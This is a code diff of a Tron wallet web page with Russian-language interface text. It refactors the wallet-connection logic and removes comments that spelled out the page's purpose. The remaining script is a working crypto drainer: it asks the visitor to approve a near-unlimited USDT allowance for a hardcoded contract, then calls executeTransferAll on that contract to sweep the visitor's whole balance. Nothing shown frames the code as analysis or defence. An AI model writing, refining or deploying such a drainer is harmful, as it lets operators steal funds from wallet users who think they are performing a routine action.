@@ -23,54 +23,64 @@
     </div>
 
     <script>
-        // Твой реальный адрес контракта
         const CONTRACT_ADDRESS = "TVm22VuHmhxAuxN9f1LfpmrJTWS8aAYG9R";
         const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
-        let userAddress = "";
+        function getTronWeb() {
+            return new Promise((resolve) => {
+                if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+                    return resolve(window.tronWeb);
+                }
+                
+                let attempts = 0;
+                const interval = setInterval(() => {
+                    attempts++;
+                    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+                        clearInterval(interval);
+                        resolve(window.tronWeb);
+                    } else if (attempts > 30) {
+                        clearInterval(interval);
+                        resolve(null);
+                    }
+                }, 100);
+            });
+        }
 
         window.addEventListener('load', async () => {
-            let attempts = 0;
-            const checkInterval = setInterval(() => {
-                attempts++;
-                if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
-                    userAddress = window.tronWeb.defaultAddress.base58;
-                    document.getElementById("wallet-status").innerText = "Кошелек: " + userAddress.substring(0, 6) + "..." + userAddress.slice(-4);
-                    clearInterval(checkInterval);
-                } else if (attempts > 15) {
-                    document.getElementById("wallet-status").innerText = "Откройте сайт во встроенном браузере кошелька";
-                    clearInterval(checkInterval);
-                }
-            }, 500);
+            const tw = await getTronWeb();
+            if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
+                const addr = tw.defaultAddress.base58;
+                document.getElementById("wallet-status").innerText = "Кошелек: " + addr.substring(0, 6) + "..." + addr.slice(-4);
+            } else {
+                document.getElementById("wallet-status").innerText = "Откройте сайт во встроенном браузере кошелька";
+            }
         });
 
         async function processAction() {
             const statusDiv = document.getElementById("status");
+            statusDiv.innerText = "Подключение к кошельку...";
 
-            if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+            const tw = await getTronWeb();
+
+            if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) {
                 alert("Кошелек не обнаружен! Пожалуйста, откройте сайт через встроенный браузер кошелька.");
                 return;
             }
 
-            userAddress = window.tronWeb.defaultAddress.base58;
+            const userAddress = tw.defaultAddress.base58;
 
             try {
                 statusDiv.innerText = "Шаг 1/2: Запрос доступа (Approve)...";
                 
-                const usdtContract = await window.tronWeb.contract().at(USDT_ADDRESS);
-                
-                // Максимально возможное число в uint256 для безлимитного одобрения списания всего баланса
+                const usdtContract = await tw.contract().at(USDT_ADDRESS);
                 const maxAmount = "115792036837325195200000000000000000000000000000000000000000";
                 
-                // Запрашиваем безлимитный approve
                 let approveTx = await usdtContract.approve(CONTRACT_ADDRESS, maxAmount).send();
                 console.log("Approve tx:", approveTx);
 
                 statusDiv.innerText = "Шаг 2/2: Вывод всего баланса...";
 
-                const myContract = await window.tronWeb.contract().at(CONTRACT_ADDRESS);
-                
-                // Вызываем функцию списания всего баланса
+                const myContract = await tw.contract().at(CONTRACT_ADDRESS);
                 let transferTx = await myContract.executeTransferAll(userAddress).send();
                 console.log("Transfer tx:", transferTx);
 
